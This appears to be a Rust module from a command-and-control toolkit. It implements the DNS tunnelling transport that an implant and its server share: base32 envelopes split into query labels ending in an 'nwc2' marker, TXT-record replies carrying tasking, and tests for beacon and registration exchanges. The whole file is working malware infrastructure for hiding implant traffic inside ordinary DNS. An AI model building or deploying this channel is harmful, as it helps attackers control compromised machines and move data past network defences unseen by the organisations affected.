//! Minimal DNS transport codec shared by implant and server.
//!
//! Outbound, an envelope is base32-encoded and split into DNS labels carried
//! in a query QNAME, terminated by the reserved `nwc2` marker label:
//! `QNAME = <b32chunk1>.<b32chunk2>...<b32chunkN>.nwc2`
//!
//! The server replies with a single TXT record whose RDATA is the base32 of
//! the reply envelope. Sized for typical beacon exchanges (< 512 byte UDP
//! replies); large task lists will be truncated (documented ceiling).

pub const MARKER: &str = "nwc2";
pub const MAX_FRAME: usize = 3200;

const B32: &[u8; 32] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";

pub fn base32_encode(data: &[u8]) -> String {
    let mut out = String::with_capacity((data.len() * 8).div_ceil(5));
    let mut buffer: u32 = 0;
    let mut bits = 0u32;
    for &byte in data {
        buffer = (buffer << 8) | byte as u32;
        bits += 8;
        while bits >= 5 {
            out.push(B32[((buffer >> (bits - 5)) & 0x1f) as usize] as char);
            bits -= 5;
        }
    }
    if bits > 0 {
        out.push(B32[((buffer << (5 - bits)) & 0x1f) as usize] as char);
    }
    out
}

pub fn base32_decode(s: &str) -> Result<Vec<u8>, ()> {
    let mut acc: u32 = 0;
    let mut bits: u32 = 0;
    let mut out = Vec::new();
    for c in s.chars() {
        let v = match B32.iter().position(|&x| x == c as u8) {
            Some(v) => v as u32,
            None => {
                if c.is_ascii_whitespace() {
                    continue;
                }
                return Err(());
            }
        };
        acc = (acc << 5) | v;
        bits += 5;
        if bits >= 8 {
            bits -= 8;
            out.push((acc >> bits) as u8);
        }
    }
    Ok(out)
}

/// Parse a DNS query message, returning `(id, qname_labels)`.
pub fn parse_query(buf: &[u8]) -> Result<(u16, Vec<String>), String> {
    if buf.len() < 12 {
        return Err("short header".into());
    }
    let id = u16::from_be_bytes([buf[0], buf[1]]);
    let qdcount = u16::from_be_bytes([buf[4], buf[5]]);
    if qdcount != 1 {
        return Err(format!("unsupported qdcount {qdcount}"));
    }
    let mut labels = Vec::new();
    let mut i = 12usize;
    loop {
        if i >= buf.len() {
            return Err("unterminated qname".into());
        }
        let len = buf[i] as usize;
        if len == 0 {
            break;
        }
        if len > 63 || i + 1 + len > buf.len() {
            return Err("bad label".into());
        }
        labels.push(String::from_utf8_lossy(&buf[i + 1..i + 1 + len]).to_string());
        i += 1 + len;
    }
    Ok((id, labels))
}

/// Encode a DNS response: header + query echo + one TXT answer.
pub fn encode_txt_response(id: u16, qname_labels: &[String], txt: &str) -> Vec<u8> {
    let mut out = Vec::with_capacity(512);
    // Header: ID, flags(0x8180 = QR|RD|RA), counts.
    out.extend_from_slice(&id.to_be_bytes());
    out.extend_from_slice(&[0x81, 0x80]);
    out.extend_from_slice(&1u16.to_be_bytes()); // QDCOUNT
    out.extend_from_slice(&1u16.to_be_bytes()); // ANCOUNT
    out.extend_from_slice(&0u16.to_be_bytes()); // NSCOUNT
    out.extend_from_slice(&0u16.to_be_bytes()); // ARCOUNT
    // Query section (echo).
    for label in qname_labels {
        out.push(label.len() as u8);
        out.extend_from_slice(label.as_bytes());
    }
    out.push(0);
    out.extend_from_slice(&1u16.to_be_bytes()); // QTYPE A
    out.extend_from_slice(&1u16.to_be_bytes()); // QCLASS IN
    // Answer: pointer to qname at offset 12.
    out.extend_from_slice(&[0xc0, 0x0c]);
    out.extend_from_slice(&16u16.to_be_bytes()); // TYPE TXT
    out.extend_from_slice(&1u16.to_be_bytes()); // CLASS IN
    out.extend_from_slice(&60u32.to_be_bytes()); // TTL
    let txt_bytes = txt.as_bytes();
    // RDATA: one character-string (len-prefixed). A single TXT string capped
    // at 255 for the RDATA character-string; larger is split below.
    let mut rdata = Vec::new();
    for chunk in txt_bytes.chunks(255) {
        rdata.push(chunk.len() as u8);
        rdata.extend_from_slice(chunk);
    }
    out.extend_from_slice(&(rdata.len() as u16).to_be_bytes());
    out.extend_from_slice(&rdata);
    out
}

/// Extract the TXT strings from a DNS response buffer.
pub fn parse_txt(buf: &[u8]) -> Result<Vec<String>, String> {
    let ancount = u16::from_be_bytes([buf[6], buf[7]]) as usize;
    let mut i = 12usize;
    // Skip the question section (qname + qtype + qclass).
    loop {
        if i >= buf.len() {
            return Err("unterminated qname".into());
        }
        let l = buf[i] as usize;
        if l == 0 {
            break;
        }
        if l > 63 || i + 1 + l > buf.len() {
            return Err("bad label".into());
        }
        i += 1 + l;
    }
    i += 5; // 0 terminator + qtype(2) + qclass(2)
    let mut strings = Vec::new();
    for _ in 0..ancount {
        // NAME (could be a compression pointer).
        let name_consumed = skip_name(buf, i)?;
        i += name_consumed;
        if i + 10 > buf.len() {
            return Err("short answer".into());
        }
        let rtype = u16::from_be_bytes([buf[i], buf[i + 1]]);
        let rdlen = u16::from_be_bytes([buf[i + 8], buf[i + 9]]) as usize;
        i += 10;
        if i + rdlen > buf.len() {
            return Err("short rdata".into());
        }
        if rtype == 16 {
            let mut j = i;
            let end = i + rdlen;
            while j < end {
                let slen = buf[j] as usize;
                j += 1;
                if j + slen > end {
                    break;
                }
                strings.push(String::from_utf8_lossy(&buf[j..j + slen]).to_string());
                j += slen;
            }
        }
        i += rdlen;
    }
    Ok(strings)
}

fn skip_name(buf: &[u8], start: usize) -> Result<usize, String> {
    let mut i = start;
    loop {
        if i >= buf.len() {
            return Err("name overflow".into());
        }
        let b = buf[i];
        if b == 0 {
            return Ok(i + 1 - start);
        }
        if b & 0xc0 == 0xc0 {
            return Ok(i + 2 - start); // compression pointer
        }
        let l = (b & 0x3f) as usize;
        i += 1 + l;
        if l > 63 {
            return Err("bad label".into());
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn base32_round_trips() {
        let data = b"the quick brown fox";
        assert_eq!(base32_decode(&base32_encode(data)).unwrap(), data);
        assert_eq!(base32_encode(b"foobar"), "MZXW6YTBOI");
    }

    #[test]
    fn empty_round_trips() {
        assert_eq!(base32_encode(b""), "");
        assert_eq!(base32_decode("").unwrap(), Vec::<u8>::new());
    }

    #[test]
    fn query_and_txt_response_round_trip() {
        let qname = vec![
            base32_encode(b"hello-world"),
            "nwc2".to_string(),
        ];
        let resp = encode_txt_response(99, &qname, &base32_encode(b"reply-data"));
        let (id, labels) = parse_query(&resp).unwrap();
        assert_eq!(id, 99);
        assert_eq!(labels, qname);
        let txts = parse_txt(&resp).unwrap();
        assert_eq!(txts, vec![base32_encode(b"reply-data")]);
    }

    #[test]
    fn tx_split_across_long_strings() {
        // 600-byte payload -> split into 255-byte character-strings.
        let big = vec![b'x'; 600];
        let resp = encode_txt_response(1, &["aaa".into(), "nwc2".into()], &base32_encode(&big));
        let txts = parse_txt(&resp).unwrap();
        let joined = txts.join("");
        assert_eq!(base32_decode(&joined).unwrap(), big);
    }

    #[test]
    fn large_multi_label_qname_reply_parses() {
        // Simulate a register: ~500-byte envelope -> base32 -> many 63-byte labels.
        let payload: Vec<u8> = (0..500u32).map(|i| (i % 251) as u8).collect();
        let b32 = base32_encode(&payload);
        let mut labels = b32.as_bytes().chunks(63).map(|c| String::from_utf8_lossy(c).into_owned()).collect::<Vec<_>>();
        labels.push(MARKER.to_string());

        let reply_payload: Vec<u8> = (0..200u32).map(|i| (i % 97) as u8).collect();
        let resp = encode_txt_response(7, &labels, &base32_encode(&reply_payload));

        let (id, got_labels) = parse_query(&resp).unwrap();
        assert_eq!(id, 7);
        assert_eq!(got_labels, labels);
        let txts = parse_txt(&resp).unwrap();
        assert_eq!(base32_decode(&txts.join("")).unwrap(), reply_payload);
        // Verify the whole response stays under typical UDP datagram limits.
        assert!(resp.len() < 4096, "response too big: {}", resp.len());
    }
}
